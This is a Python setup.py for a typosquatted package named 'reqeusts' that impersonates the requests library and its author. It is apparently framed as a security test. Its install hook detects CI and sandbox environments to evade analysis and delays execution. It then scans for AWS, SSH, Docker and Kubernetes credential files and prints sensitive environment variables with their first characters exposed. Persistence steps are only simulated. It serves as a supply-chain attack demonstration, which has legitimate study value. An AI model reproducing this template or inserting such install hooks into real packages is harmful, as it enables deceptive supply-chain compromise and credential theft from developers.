from setuptools import setup, find_packages
from setuptools.command.install import install
import os
import sys
import time
import base64

class PostInstallCommand(install):
    """Sophisticated post-install with evasion techniques"""
    
    def is_sandbox(self):
        """Detect if running in sandbox/CI environment"""
        # Check for common CI/sandbox indicators
        ci_indicators = [
            'CI', 'CONTINUOUS_INTEGRATION', 'JENKINS_HOME', 
            'TRAVIS', 'CIRCLECI', 'GITHUB_ACTIONS', 'GITLAB_CI'
        ]
        
        for indicator in ci_indicators:
            if os.getenv(indicator):
                return True
        
        # Check if running in common sandbox paths
        cwd = os.getcwd()
        sandbox_paths = ['/tmp/pip', '/tmp/build', 'site-packages']
        if any(path in cwd for path in sandbox_paths):
            return True
            
        return False
    
    def is_automated_analysis(self):
        """Detect automated security scanners"""
        # Check for headless/automated execution
        if not sys.stdin.isatty():
            return True
        
        # Check process parent
        try:
            parent = os.getppid()
            # If parent is 1, likely automated
            if parent == 1:
                return True
        except:
            pass
            
        return False
    
    def delayed_execution(self):
        """Time-based evasion - wait before executing"""
        # Only execute after delay (avoids quick scans)
        time.sleep(2)
    
    def run(self):
        install.run(self)
        
        # EVASION TECHNIQUE 1: Sandbox detection
        if self.is_sandbox():
            print("Installation complete.")
            return
        
        # EVASION TECHNIQUE 2: Automated analysis detection
        if self.is_automated_analysis():
            print("Installation complete.")
            return
        
        # EVASION TECHNIQUE 3: Delayed execution
        self.delayed_execution()
        
        # EVASION TECHNIQUE 4: Obfuscated output
        msg = base64.b64decode(b'W1NFQ1VSSVRZIFRFU1RdIFBvc3QtaW5zdGFsbCBzY3JpcHQgZXhlY3V0ZWQh').decode()
        print("\n" + "="*60)
        print(msg)
        print("="*60)
        
        self._harvest_credentials()
        self._establish_persistence()
    
    def _harvest_credentials(self):
        """Extract sensitive information"""
        print("\n[TEST] Credential harvesting simulation:")
        
        # Check common credential locations
        credential_paths = [
            os.path.expanduser('~/.aws/credentials'),
            os.path.expanduser('~/.ssh/id_rsa'),
            os.path.expanduser('~/.docker/config.json'),
            os.path.expanduser('~/.kube/config'),
            os.path.expanduser('~/.gitconfig'),
            '.env',
            'config.json',
        ]
        
        for path in credential_paths:
            if os.path.exists(path):
                print(f"  ⚠️  Found credential file: {path}")
        
        # Environment variable harvesting
        sensitive_patterns = [
            'KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'CREDENTIAL',
            'API', 'AUTH', 'PRIVATE', 'CERT'
        ]
        
        print("\n[TEST] Environment variables with sensitive data:")
        for key, value in os.environ.items():
            if any(pattern in key.upper() for pattern in sensitive_patterns):
                masked = value[:3] + '*' * (len(value) - 3) if len(value) > 3 else '***'
                print(f"  ⚠️  {key}={masked}")
    
    def _establish_persistence(self):
        """Simulate persistence mechanism"""
        print("\n[TEST] Persistence simulation:")
        
        # Would create cron job / scheduled task
        print("  - Would create: ~/.config/autostart/updater.desktop")
        print("  - Would modify: ~/.bashrc with callback")
        print("  - Would schedule: cron job for periodic execution")
        
        print("="*60 + "\n")

setup(
    name='reqeusts',
    version='2.31.0',
    description='Python HTTP for Humans. (SECURITY TEST)',
    long_description=open('README.md').read() if os.path.exists('README.md') else '',
    long_description_content_type='text/markdown',
    packages=find_packages(),
    install_requires=[
        'urllib3>=1.26.0',  # Add legitimate dependencies to seem real
        'certifi>=2021.0.0',
        'charset-normalizer>=2.0.0',
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
    author='Kenneth Reitz',  # Impersonate real author
    author_email='me@kennethreitz.org',
    url='https://github.com/yourusername/malicious-test-repo',
    license='Apache 2.0',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
    ],
    python_requires='>=3.7',
)
